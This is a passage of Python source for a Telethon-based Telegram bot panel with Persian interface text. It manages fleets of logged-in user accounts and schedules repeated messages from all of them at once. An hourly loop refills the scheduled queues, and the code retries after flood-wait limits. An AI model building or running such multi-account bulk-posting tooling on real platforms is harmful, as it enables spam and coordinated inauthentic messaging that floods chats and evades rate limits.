          return await event.answer(" ریموت دیگه‌ای وجود نداره", alert=True)
      rows = [
          [Button.inline(f"👥 {g}  ({len(groups_db[g].get('sessions',[]))} accs)",
                           f"og_domove_{gname}|{sess}|{g}".encode())]
          for g in other_groups
      ]
      rows.append([Button.inline("❌ Cancel", f"og_sess_{gname}|{sess}".encode())])
      await sp_edit(event,
          f" جابجایی {sess}\n"
          f"━━━━━━━━━━━━━━\n"
          f"الان در ریموت: {gname}\n"
          f"انتقال به کدوم ریموت؟",
          buttons=rows)
      await event.answer()

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_domove_([^|]+)\|([^|]+)\|(.+)")))
    async def og_domove_cb(event):
      from_g = event.pattern_match.group(1).decode()
      sess   = event.pattern_match.group(2).decode()
      to_g   = event.pattern_match.group(3).decode()
      # باید هم گروه مبدا هم گروه مقصد رو بررسی کنیم
      if not og_guard(event, from_g) or not og_guard(event, to_g):
          return await event.answer(" دسترسی ندارید", alert=True)
      if to_g not in groups_db:
          return await event.answer(" ریموت مقصد وجود نداره", alert=True)
      # remove from source group first so assign_session_to_group isolation check passes
      src_sessions = groups_db.get(from_g, {}).get("sessions", [])
      if sess in src_sessions:
          src_sessions.remove(sess)
      # add to target group via helper (enforces capacity + isolation)
      _err = assign_session_to_group(sess, to_g)
      if _err:
          # rollback: restore to source
          groups_db.get(from_g, {}).setdefault("sessions", []).append(sess)
          save_groups()
          return await event.answer(f" خطا در انتقال: {_err}", alert=True)
      await event.answer(f" {sess} به {to_g} منتقل شد", alert=True)
      await sp_edit(event,
          f" جابجایی انجام شد!\n"
          f"━━━━━━━━━━━━━━\n"
          f"اکانت: {sess}\n"
          f"از: {from_g}\n"
          f"به: {to_g}",
          buttons=[
              [Button.inline(f"🔘 Manage {to_g}", f"og_home_{to_g}".encode())],
              [Button.inline(f"🔙 Back to {from_g}", f"og_accs_{from_g}".encode())],
              [Button.inline("📌 All Groups", b"menu_groups")],
          ])

    # ── toggle account on/off (owner panel) ───────────────────
    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_tog_on_([^|]+)\|(.+)")))
    async def og_tog_on_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer()
      sess = event.pattern_match.group(2).decode()
      if sess in managed:
          return await event.answer(" قبلاً روشنه", alert=True)
      manually_disabled.discard(sess)  # از لیست دستی‌خاموش در بیار
      save_disabled()
      # اگه protected client داشت قطع کن تا با managed تداخل نداشته باشه
      await stop_protected_client(sess)
      await start_worker(sess)
      if sess in managed:
          await event.answer(" اکانت روشن شد", alert=True)
      else:
          await event.answer(" روشن نشد — session فایل موجود نیست", alert=True)
      await sp_edit(event, f" {sess} — وضعیت: {'🟢 آنلاین' if sess in managed else '🔴 آفلاین'}",
                     buttons=[[Button.inline("🔙 Back", f"og_accs_{gname}".encode())]])

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_tog_off_([^|]+)\|(.+)")))
    async def og_tog_off_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer()
      sess = event.pattern_match.group(2).decode()
      manually_disabled.add(sess)  # جلوگیری از روشن شدن خودکار
      save_disabled()
      meta = managed.pop(sess, None)
      if meta:
          t = meta.get("task")
          if t:
              t.cancel()
          try:
              await meta["client"].disconnect()
          except Exception:
              pass
          await event.answer(" اکانت خاموش شد", alert=True)
      else:
          await event.answer(" قبلاً خاموشه", alert=True)
      # اگه burn یا guard روشنه، protected client بساز
      asyncio.create_task(refresh_protected_clients())
      await sp_edit(event, f" {sess} — وضعیت:  آفلاین",
                     buttons=[[Button.inline("🔙 Back", f"og_accs_{gname}".encode())]])

    # ── delete account (owner panel) ──────────────────────────
    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_delacc_([^|]+)\|(.+)")))
    async def og_delacc_cb(event):
      gname = event.pattern_match.group(1).decode()
      # جلوگیری از تداخل با og_delacc_ok_ که gname با "ok_" شروع میشه
      if gname.startswith("ok_"):
          return await event.answer()
      if not og_guard(event, gname):
          return await event.answer()
      sess = event.pattern_match.group(2).decode()
      phone = sessions_db.get(sess, {}).get("phone", "?")
      await sp_edit(event,
          f" Delete Account\n━━━━━━━━━━━━━━\n"
          f"اکانت: {sess}\nشماره: {phone}\n\n"
          f" مطمئنی؟ این اکانت از ریموت و دیتابیس حذف میشه.",
          buttons=[
              [Button.inline("✅ Yes, Delete", f"og_delacc_ok_{gname}|{sess}".encode()),
                 Button.inline("❌ No", f"og_sess_{gname}|{sess}".encode())],
          ])
      await event.answer()

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_delacc_ok_([^|]+)\|(.+)")))
    async def og_delacc_ok_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer()
      sess = event.pattern_match.group(2).decode()
      meta = managed.pop(sess, None)
      if meta:
          t = meta.get("task")
          if t:
              t.cancel()
          try:
              await meta["client"].disconnect()
          except Exception:
              pass
      if gname in groups_db:
          slist = groups_db[gname].get("sessions", [])
          if sess in slist:
              slist.remove(sess)
          save_groups()
      sessions_db.pop(sess, None)
      save_db()
      await sp_edit(event,
          f" اکانت «{sess}» حذف شد.",
          buttons=[[Button.inline("🔙 Back to Accounts", f"og_accs_{gname}".encode())]])

    # ── حذف اکانت فقط از این گروه (بدون پاک کردن کامل) ──────
    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_remfromgrp_([^|]+)\|(.+)")))
    async def og_remfromgrp_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      sess = event.pattern_match.group(2).decode()
      phone = sessions_db.get(sess, {}).get("phone", "?")
      await sp_edit(event,
          f"➖ حذف از ریموت\n━━━━━━━━━━━━━━\n"
          f"اکانت: {sess}\nشماره: {phone}\n\n"
          f"این اکانت فقط از ریموت «{gname}» حذف می‌شه.\n"
          f"اکانت در سیستم باقی می‌مونه و قابل استفاده مجدده.",
          buttons=[
              [Button.inline("✅ بله، حذف از گروه", f"og_remfromgrp_ok_{gname}|{sess}".encode()),
                 Button.inline("❌ لغو", f"og_sess_{gname}|{sess}".encode())],
          ])
      await event.answer()

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_remfromgrp_ok_([^|]+)\|(.+)")))
    async def og_remfromgrp_ok_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      sess = event.pattern_match.group(2).decode()
      if gname in groups_db:
          slist = groups_db[gname].get("sessions", [])
          if sess in slist:
              slist.remove(sess)
          save_groups()
      await sp_edit(event,
          f"✅ اکانت «{sess}» از ریموت «{gname}» حذف شد.\n"
          f"اکانت در سیستم باقیه و می‌تونی دوباره به ریموت اضافه‌اش کنی.",
          buttons=[[Button.inline("🔙 لیست اکانت‌ها", f"og_accs_{gname}".encode())]])
      await event.answer()

    # ── افزودن اکانت به گروه ─────────────────────────────────
    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_addacc_(.+)")))
    async def og_addacc_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      current = set(og_sessions(gname))
      # سشن‌هایی که توی هیچ گروه دیگه‌ای نیستن (آزاد هستن)
      all_grouped_elsewhere = set()
      for _gn, _gi in groups_db.items():
          if _gn != gname:
              all_grouped_elsewhere.update(_gi.get("sessions", []))
      available = [s for s in sessions_db if s not in current
                     and s not in all_grouped_elsewhere
                     and s not in (MAIN_SESSION, "bot_session")]
      if not available:
          await sp_edit(event,
              f"➕ افزودن اکانت به ریموت «{gname}»\n━━━━━━━━━━━━━━\n"
              f"هیچ اکانت آزادی پیدا نشد.\n"
              f"همه اکانت‌های موجود در سیستم یا قبلاً به این ریموت اضافه شدن یا در ریموت دیگه‌ای هستن.\n\n"
              f"اگه می‌خوای یه اکانت تازه (با شماره تلفن) وارد کنی و مستقیم به همین ریموت اضافه بشه، از دکمه زیر استفاده کن:",
              buttons=[
                  [Button.inline("🆕 ورود اکانت جدید (شماره)", f"og_newacc_{gname}".encode())],
                  [Button.inline("🔙 Back", f"og_accs_{gname}".encode())],
              ])
          return await event.answer()
      rows = []
      for s in available:
          icon = "🟢" if s in managed else "🔴"
          phone = sessions_db.get(s, {}).get("phone", "")
          label = f"{icon} {s}" + (f" ({phone})" if phone else "")
          rows.append([Button.inline(label[:60], f"og_addacc_do_{gname}|{s}".encode())])
      rows.append([Button.inline("🆕 ورود اکانت جدید (شماره)", f"og_newacc_{gname}".encode())])
      rows.append([Button.inline("🔙 Back", f"og_accs_{gname}".encode())])
      await sp_edit(event,
          f"➕ افزودن اکانت به ریموت «{gname}»\n━━━━━━━━━━━━━━\n"
          f"{len(available)} اکانت آزاد موجوده — یکی رو انتخاب کن، یا یه اکانت تازه با شماره وارد کن:",
          buttons=rows)
      await event.answer()

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_addacc_do_([^|]+)\|(.+)")))
    async def og_addacc_do_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      sess = event.pattern_match.group(2).decode()
      if sess in (MAIN_SESSION, "bot_session"):
          return await event.answer(" این سشن سیستمیه", alert=True)
      _err = assign_session_to_group(sess, gname)
      if _err:
          return await event.answer(f" {_err}", alert=True)
      phone = sessions_db.get(sess, {}).get("phone", "")
      status = "🟢 آنلاین" if sess in managed else "🔴 آفلاین"
      await sp_edit(event,
          f"✅ اکانت «{sess}» به ریموت «{gname}» اضافه شد!\n"
          f"━━━━━━━━━━━━━━\n"
          f"شماره: {phone or '—'}\nوضعیت: {status}",
          buttons=[
              [Button.inline("➕ افزودن اکانت دیگه", f"og_addacc_{gname}".encode())],
              [Button.inline("📱 لیست اکانت‌ها", f"og_accs_{gname}".encode())],
              [Button.inline("🏠 منوی ریموت", f"og_home_{gname}".encode())],
          ])
      await event.answer()

    # ── Multi-select session assignment ─────────────────────────────────────
    def _multi_add_buttons(gname: str, available: list, selected: Set[str]) -> list:
      rows = []
      for s in available:
          icon = "🟢" if s in managed else "🔴"
          phone = sessions_db.get(s, {}).get("phone", "")
          label_base = f"{icon} {s}" + (f" ({phone})" if phone else "")
          tick = "✅" if s in selected else "⬜"
          rows.append([Button.inline(f"{tick} {label_base}"[:60], f"og_multitog_{gname}|{s}".encode())])
      sel_count = len(selected)
      confirm_lbl = f"✅ تایید ({sel_count} انتخاب شده)" if sel_count else "✅ تایید"
      rows.append([Button.inline(confirm_lbl, f"og_multiconfirm_{gname}".encode())])
      rows.append([Button.inline("❌ انصراف", f"og_accs_{gname}".encode())])
      return rows

    def _multi_available(gname: str) -> list:
      current = set(og_sessions(gname))
      elsewhere = set()
      for _gn, _gi in groups_db.items():
          if _gn != gname:
              elsewhere.update(_gi.get("sessions", []))
      return [s for s in sessions_db
              if s not in current and s not in elsewhere
              and s not in (MAIN_SESSION, "bot_session")]

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_addmulti_(.+)")))
    async def og_addmulti_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      available = _multi_available(gname)
      if not available:
          await sp_edit(event,
              f"➕ افزودن چندتایی سشن به ریموت «{gname}»\n━━━━━━━━━━━━━━\n"
              f"هیچ سشن آزادی پیدا نشد.\nهمه سشن‌ها یا در این ریموت هستن یا در ریموت دیگه‌ای.",
              buttons=[[Button.inline("🔙 Back", f"og_accs_{gname}".encode())]])
          return await event.answer()
      sid = event.sender_id
      _multi_add_sel.setdefault(sid, {})[gname] = set()
      await sp_edit(event,
          f"➕ افزودن چندتایی سشن به ریموت «{gname}»\n━━━━━━━━━━━━━━\n"
          f"{len(available)} سشن آزاد — روی هر کدوم بزن تا تیک بخوره، آخرش تایید کن:",
          buttons=_multi_add_buttons(gname, available, set()))
      await event.answer()

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_multitog_([^|]+)\|(.+)")))
    async def og_multitog_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      sess = event.pattern_match.group(2).decode()
      sid = event.sender_id
      sel = _multi_add_sel.setdefault(sid, {}).setdefault(gname, set())
      if sess in sel:
          sel.discard(sess)
          await event.answer("⬜ برداشته شد")
      else:
          sel.add(sess)
          await event.answer("✅ انتخاب شد")
      available = _multi_available(gname)
      await sp_edit(event,
          f"➕ افزودن چندتایی سشن به ریموت «{gname}»\n━━━━━━━━━━━━━━\n"
          f"{len(available)} سشن آزاد — {len(sel)} انتخاب شده:",
          buttons=_multi_add_buttons(gname, available, sel))

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_multiconfirm_(.+)")))
    async def og_multiconfirm_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      sid = event.sender_id
      sel = _multi_add_sel.get(sid, {}).get(gname, set())
      if not sel:
          return await event.answer("هیچ سشنی انتخاب نشده!", alert=True)
      added, failed = [], []
      for sess in list(sel):
          err = assign_session_to_group(sess, gname)
          if err:
              failed.append(f"❌ {sess}: {err}")
          else:
              added.append(f"✅ {sess}")
      _multi_add_sel.get(sid, {}).pop(gname, None)
      lines = "\n".join(added + failed)
      summary = f"{'✅ ' + str(len(added)) + ' سشن اضافه شد' if added else ''}{'  ❌ ' + str(len(failed)) + ' ناموفق' if failed else ''}"
      await sp_edit(event,
          f"📋 نتیجه افزودن سشن به ریموت «{gname}»\n━━━━━━━━━━━━━━\n{lines}\n\n{summary}",
          buttons=[
              [Button.inline("📱 لیست اکانت‌ها", f"og_accs_{gname}".encode())],
              [Button.inline("🏠 منوی ریموت", f"og_home_{gname}".encode())],
          ])
      await event.answer()

    # ── ورود اکانت جدید (شماره تلفن) — مستقیم به همین ریموت اضافه می‌شه ──
    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_newacc_(.+)")))
    async def og_newacc_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      if is_group_full(gname):
          max_acc = groups_db.get(gname, {}).get("max_accounts")
          return await event.answer(f" ریموت به سقف {max_acc} اکانت رسیده", alert=True)
      pending_group_selection[event.sender_id] = {"og_step": "og_newacc_phone", "og_gname": gname}
      await sp_edit(event,
          f"🆕 ورود اکانت جدید به ریموت «{gname}»\n━━━━━━━━━━━━━━\n"
          f"شماره تلفن اکانت رو با فرمت بین‌المللی بنویس:\n(مثال: +989xxxxxxxxx)",
          buttons=[[Button.inline("❌ Cancel", f"og_addacc_{gname}".encode())]])
      await event.answer()

    # send message panel
    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_send_(.+)")))
    async def og_send_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      pending_group_selection[event.sender_id] = {"og_step": "send_target", "og_gname": gname}
      await sp_edit(event,
          f" چت مقصد رو بنویس:\n(@username یا -100xxxxxxxx)",
          buttons=[[Button.inline("❌ Cancel", f"og_home_{gname}".encode())]])
      await event.answer()

    # ═══════════════════════════════════════════════════════════
    # SCHEDULED MESSAGE PANEL  (og_sched_ prefix)
    # ═══════════════════════════════════════════════════════════
    def _fmt_secs(secs):
      secs = int(secs)
      h, rem = divmod(secs, 3600)
      m, s   = divmod(rem, 60)
      if h:
          return f"{h}h {m}m" if m else f"{h}h"
      if m:
          return f"{m}m {s}s" if s else f"{m}m"
      return f"{s}s"

    async def _resolve_entity(client, chat):
      """Try multiple strategies to resolve a chat entity.
      Returns entity or None. Never raises.
      Strategy 1: get_entity (cache-based, instant)
      Strategy 2: GetChannelsRequest with access_hash=0 (works for joined channels
                    even without local cache — fixes ChannelPrivateError)"""
      # 1. Normal cache-based lookup
      try:
          return await client.get_entity(chat)
      except Exception:
          pass

      # 2. Direct API call with access_hash=0 — works for any channel the account
      #    has joined, even if access_hash was never cached locally
      try:
          from telethon.tl.functions.channels import GetChannelsRequest as _GCR
          from telethon.tl.types import InputChannel as _IC
          raw_id = abs(int(str(chat).replace("-100", "").lstrip("-")))
          result = await client(_GCR([_IC(raw_id, 0)]))
          if result.chats:
              return result.chats[0]
      except Exception:
          pass

      return None

    def _parse_interval(raw):
      """Parse interval string like 5m / 2h / 90s / 1h30m → seconds."""
      raw = raw.strip().lower()
      import re as _re
      total = 0
      for val, unit in _re.findall(r"(\d+(?:\.\d+)?)\s*([hms])", raw):
          v = float(val)
          if unit == "h": total += v * 3600
          elif unit == "m": total += v * 60
          elif unit == "s": total += v
      if total == 0:
          try:
              total = float(raw) * 60
          except ValueError:
              pass
      return total

    MAX_NATIVE_SCHEDULE = 100  # Telegram-side cap on how many we pre-register at once

    async def _run_native_schedule_loop(event, sess, chat, texts, interval, count, key,
                                        gname, ivl_str, stop_label_extra, bulk_mode=False):
      """Pre-register every message of a repeat-send loop as a NATIVE Telegram
      scheduled message (schedule=timestamp). Returns (sent_count, error_str_or_None).
      In bulk_mode=True individual result messages are suppressed."""
      meta = managed.get(sess)
      if not meta:
          if not bulk_mode:
              await sp(event.chat_id, f" سشن {sess} آفلاینه — ابتدا آنلاینش کن.",
                         buttons=[[Button.inline("🔙 Back", f"og_sched_{gname}".encode())]])
          return 0, "ERR:آفلاین"

      capped = min(count, MAX_NATIVE_SCHEDULE)
      cap_note = "" if capped == count else f"\n⚠️ به خاطر محدودیت تلگرام فقط {capped} پیام (به جای {count}) ثبت شد."

      # ── resolve chat entity (3-strategy helper) ─────────────
      chat_entity = await _resolve_entity(meta["client"], chat)

      if chat_entity is None:
          log.warning(f"[native_sched] {sess} cannot resolve chat {chat}")
          if not bulk_mode:
              await sp(event.chat_id,
                         f" سشن {sess} — گپ {chat} پیدا نشد.\n"
                         f"احتمالاً این سشن عضو کانال/گروه نیست.",
                         buttons=[[Button.inline("🔙 Back", f"og_sched_{gname}".encode())]])
          return 0, "ERR:عضو کانال نیست یا دسترسی ندارد"

      # ── register scheduled messages ─────────────────────────
      now_ts = int(time.time())
      msg_ids = []
      sent = 0
      for i in range(capped):
          ts = now_ts + int(round(interval * (i + 1)))
          msg_text = texts[i % len(texts)] if texts else None
          if not msg_text:
              continue
          try:
              m = await meta["client"].send_message(chat_entity, msg_text, schedule=ts)
              if m and getattr(m, "id", None):
                    msg_ids.append(m.id)
              sent += 1
          except FloodWaitError as e:
              wait = e.seconds + random.randint(1, 3)
              log.warning(f"[native_sched] FloodWait {sess}: sleeping {wait}s")
              await asyncio.sleep(wait)
              # retry this message after flood wait
              try:
                    m = await meta["client"].send_message(chat_entity, msg_text, schedule=ts)
                    if m and getattr(m, "id", None):
                        msg_ids.append(m.id)
                    sent += 1
              except Exception:
                    pass
          except Exception as e:
              log.warning(f"[native_sched] schedule error {sess}: {e}")
          await asyncio.sleep(0.05)

      native_sched_batches[key] = {"sess": sess, "chat": chat, "msg_ids": msg_ids}

      # Build timestamp info for verification
      import datetime as _dt
      first_ts = now_ts + int(round(interval * 1))
      last_ts  = now_ts + int(round(interval * sent)) if sent else first_ts
      fmt_ts   = lambda ts: _dt.datetime.utcfromtimestamp(ts).strftime("%H:%M:%S UTC")
      ts_info  = (f" اولین پیام: {fmt_ts(first_ts)}\n"
                    f" آخرین پیام: {fmt_ts(last_ts)}\n"
                    f" فاصله واقعی: هر {_fmt_secs(int(round(interval)))} ({int(round(interval))}s)\n")

      if not bulk_mode:
          await sp(event.chat_id,
              f" {sent} پیام روی سرور تلگرام زمان‌بندی شد!\n"
              f"━━━━━━━━━━━━━━\n"
              f" سشن: {sess}\n"
              f" گپ: {chat}\n"
              f" {len(texts)} متن (به ترتیب)\n"
              f"{ts_info}"
              f" تعداد کل: {stop_label_extra}{cap_note}\n\n"
              f" چون پیام‌ها روی خود تلگرام زمان‌بندی شدن، حتی اگه سشن خاموش/آفلاین بشه هم سر وقت ارسال میشن.",
              buttons=[
                    [Button.inline("❌ لغو همه (حذف از Scheduled)",
                        f"og_schedlstop_{gname}|{sess}|{chat}|{ivl_str}".encode())],
                    [Button.inline("📋 پنل زمانبندی", f"og_sched_{gname}".encode()),
                     Button.inline("📋 Menu", b"menu_refresh")],
              ])
      return sent, ts_info

    async def _bulk_refill_loop(gname, notify_chat_id):
      """Every hour: for each session in bulk_refill_configs[gname],
      count how many scheduled messages remain on Telegram servers,
      figure out how many were sent, and append that many new ones at the end."""
      import calendar as _cal
      log.info(f"[refill] auto-refill started for group {gname}")
      while True:
          await asyncio.sleep(3600)
          cfg = bulk_refill_configs.get(gname)
          if not cfg:
              break
          sessions   = cfg["sessions"]
          chat       = cfg["chat"]
          texts      = cfg["texts"]
          ivl_secs   = cfg["interval_secs"]
          ivl_str    = cfg["ivl_str"]
          report_lines = []
          for sess in sessions:
              batch_key = f"schedloop_{gname}|{sess}|{chat}|{ivl_str}"
              batch = native_sched_batches.get(batch_key, {})
              original_ids = batch.get("msg_ids", [])
              meta = managed.get(sess)
              if not meta:
                    report_lines.append(f"• {sess[:14]}: آفلاین — رد شد")
                    continue
              try:
                    chat_entity = await meta["client"].get_entity(chat)
                    result = await meta["client"](GetScheduledHistoryRequest(peer=chat_entity, hash=0))
                    current_msgs = result.messages
                    current_count = len(current_msgs)
                    original_count = len(original_ids)
                    sent_count = original_count - current_count
                    if sent_count <= 0:
                        report_lines.append(f"• {sess[:14]}: {current_count} باقی — نیازی به refill نیست")
                        continue
                    # find last scheduled timestamp
                    if current_msgs:
                        last_ts_unix = max(
                            int(_cal.timegm(m.date.timetuple())) for m in current_msgs
                        )
                    else:
                        last_ts_unix = int(time.time())
                    # add sent_count new messages after the last one
                    new_ids = []
                    for i in range(sent_count):
                        ts = last_ts_unix + int(round(ivl_secs * (i + 1)))
                        msg_text = texts[i % len(texts)] if texts else ""
                        if not msg_text:
                            continue
                        try:
                            m = await meta["client"].send_message(chat_entity, msg_text, schedule=ts)
                            if m and getattr(m, "id", None):
                                new_ids.append(m.id)
                        except FloodWaitError as fe:
                            await asyncio.sleep(fe.seconds + 2)
                        except Exception as _se:
                            log.warning(f"[refill] schedule msg error for {sess}: {_se}")
                        await asyncio.sleep(0.6)
                    # update batch: keep only remaining + new
                    remaining_ids = [m.id for m in current_msgs]
                    native_sched_batches[batch_key] = {
                        "sess": sess, "chat": chat,
                        "msg_ids": remaining_ids + new_ids,
                    }
                    report_lines.append(f"• {sess[:14]}: +{len(new_ids)} اضافه شد (باقی:{current_count})")
              except Exception as e:
                    log.warning(f"[refill] error for {sess}: {e}")
                    report_lines.append(f"• {sess[:14]}: خطا — {str(e)[:40]}")
              await asyncio.sleep(1)
          # notify owner
          try:
              report_txt = "\n".join(report_lines) or "هیچ تغییری نبود"
              await bot.send_message(notify_chat_id,
                    f" Auto-Refill — ریموت {gname}\n━━━━━━━━━━━━━━\n{report_txt}")
          except Exception:
              pass
      log.info(f"[refill] auto-refill loop ended for group {gname}")

    def _sched_panel_text(gname):
      single_list, loop_list = [], []
      for k, t in sched_tasks.items():
          if t.done():
              continue
          if k.startswith(f"sched_{gname}|"):
              parts = k.split("|", 3)
              if len(parts) >= 4:
                    _, sess, chat, ts = parts
                    single_list.append(f"• {sess[:14]} → {chat[:14]} @ {ts}")
          elif k.startswith(f"schedloop_{gname}|"):
              parts = k.split("|", 4)
              if len(parts) >= 4:
                    sess = parts[1]; chat = parts[2]; ivl = parts[3] if len(parts) > 3 else "?"
                    loop_list.append(f"• {sess[:14]} → {chat[:14]}  فاصله:{ivl}")
      for k, batch in native_sched_batches.items():
          if k.startswith(f"schedloop_{gname}|") and batch.get("msg_ids"):
              sess = batch.get("sess", "?"); chat = str(batch.get("chat", "?"))
              loop_list.append(f"• {sess[:14]} → {chat[:14]}  ({len(batch['msg_ids'])} پیام روی سرور تلگرام)")
      sessions = og_sessions(gname)
      online = sum(1 for s in sessions if s in managed)
      s_txt = "\n".join(single_list) if single_list else "ندارد"
      l_txt = "\n".join(loop_list)   if loop_list  else "ندارد"
      refill_task = bulk_refill_tasks.get(gname)
      refill_active = refill_task and not refill_task.done()
      refill_cfg = bulk_refill_configs.get(gname)
      refill_line = ""
      if refill_active and refill_cfg:
          n = len(refill_cfg.get("sessions", []))
          refill_line = f"\n Auto-Refill:  فعال ({n} اکانت — هر ۱ ساعت)"
      elif refill_cfg:
          n = len(refill_cfg.get("sessions", []))
          refill_line = f"\n Auto-Refill:  غیرفعال ({n} اکانت آماده)"
      return (
          f" ارسال زمانبندی — ریموت {gname}\n"
          f"━━━━━━━━━━━━━━\n"
          f" سشن‌ها: {len(sessions)}   آنلاین: {online}{refill_line}\n\n"
          f" یک‌بار:\n{s_txt}\n\n"
          f" تکراری:\n{l_txt}\n\n"
          f"نوع ارسال رو انتخاب کن:"
      )

    def _sched_main_buttons(gname):
      refill_task = bulk_refill_tasks.get(gname)
      refill_active = refill_task and not refill_task.done()
      refill_btn_txt = "🔄 Auto-Refill: ✅ روشن — کلیک برای خاموش" if refill_active else "🔄 Auto-Refill: ⏸ خاموش — کلیک برای روشن"
      has_bulk_cfg = bool(bulk_refill_configs.get(gname))
      rows = [
          [Button.inline("⏰ یک‌بار در زمان مشخص", f"og_schedone_{gname}".encode())],
          [Button.inline("🔘 ارسال تکراری با فاصله", f"og_schedloop_{gname}".encode())],
          [Button.inline("📌 تکراری برای همه اکانت‌ها", f"og_schedloopbulk_{gname}".encode()),
             Button.inline("📌 پاک همه", f"og_schedlbulkdel_{gname}".encode())],
          [Button.inline(refill_btn_txt, f"og_schedrefill_{gname}".encode())],
      ]
      if has_bulk_cfg:
          rows.append([Button.inline("📋 پنل لایو — وضعیت scheduled",
                                       f"og_schedlive_{gname}".encode())])
      rows.append([Button.inline("🔙 Back", f"og_home_{gname}".encode())])
      return rows

    async def _sched_show_dialogs(event, gname, sess, back_cb, step_prefix):
      """Fetch and display dialog list for session selection."""
      meta = managed.get(sess)
      if not meta:
          return await event.answer(" این سشن آفلاینه", alert=True)
      await event.answer(" دریافت لیست گپ‌ها...")
      try:
          dialogs = []
          async for d in meta["client"].iter_dialogs(limit=300):
              if d.is_group or d.is_channel or d.is_user:
                    title = (d.title or d.name or str(d.id))[:28]
                    dialogs.append((title, str(d.id)))
              if len(dialogs) >= 50:
                    break
          if not dialogs:
              await sp_edit(event, " هیچ گپی پیدا نشد.",
                             buttons=[[Button.inline("🔙 Back", back_cb.encode())]])
              return
          rows = []
          for title, cid in dialogs:
              safe = cid.replace("-", "m")
              rows.append([Button.inline(title, f"{step_prefix}|{safe}".encode())])
          rows.append([Button.inline("🔙 Back", back_cb.encode())])
          await sp_edit(event,
              f" انتخاب گپ — سشن {sess} ({len(dialogs)} گپ):",
              buttons=rows)
      except Exception as e:
          await sp_edit(event, f" خطا: {e}",
                         buttons=[[Button.inline("🔙 Back", back_cb.encode())]])

    # ── main panel ────────────────────────────────────────────
    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_sched_(.+)")))
    async def og_sched_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      await sp_edit(event, _sched_panel_text(gname), buttons=_sched_main_buttons(gname))
      await event.answer()

    # ── single-send: session list ─────────────────────────────
    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_schedone_(.+)")))
    async def og_schedone_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      sessions = og_sessions(gname)
      rows = []
      for s in sessions:
          icon = "🟢" if s in managed else "🔴"
          meta = managed.get(s)
          dn = ((meta["state"].get("display_name") or s) if meta else s)[:22]
          rows.append([Button.inline(f"🔢 {icon} {dn}", f"og_schedsess_{gname}|{s}".encode())])
      rows.append([Button.inline("🔙 Back", f"og_sched_{gname}".encode())])
      await sp_edit(event, f" یک‌بار — سشن ارسال‌کننده رو انتخاب کن:", buttons=rows)
      await event.answer()

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_schedsess_([^|]+)\|(.+)")))
    async def og_schedsess_cb(event):
      gname = event.pattern_match.group(1).decode()
      sess  = event.pattern_match.group(2).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      await _sched_show_dialogs(event, gname, sess,
                                  back_cb=f"og_schedone_{gname}",
                                  step_prefix=f"og_schedchat_{gname}|{sess}")

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_schedchat_([^|]+)\|([^|]+)\|(.+)")))
    async def og_schedchat_cb(event):
      gname    = event.pattern_match.group(1).decode()
      sess     = event.pattern_match.group(2).decode()
      safe_cid = event.pattern_match.group(3).decode()
      chat_str = safe_cid.replace("m", "-", 1) if safe_cid.startswith("m") else safe_cid
      try:
          chat_id = int(chat_str)
      except ValueError:
          chat_id = chat_str
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      pending_group_selection[event.sender_id] = {
          "og_step": "sched_text", "og_gname": gname,
          "og_sess": sess, "og_chat": chat_id,
      }
      await sp_edit(event,
          f" ارسال یک‌بار\n━━━━━━━━━━━━━━\n"
          f" سشن: {sess}\n گپ: {chat_id}\n\n"
          f" متن پیام رو بنویس:",
          buttons=[[Button.inline("❌ Cancel", f"og_sched_{gname}".encode())]])
      await event.answer()

    # ── cancel single task ────────────────────────────────────
    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_schedcancel_(.+)")))
    async def og_schedcancel_cb(event):
      key   = event.pattern_match.group(1).decode()
      gname = key.split("|")[0] if "|" in key else key
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
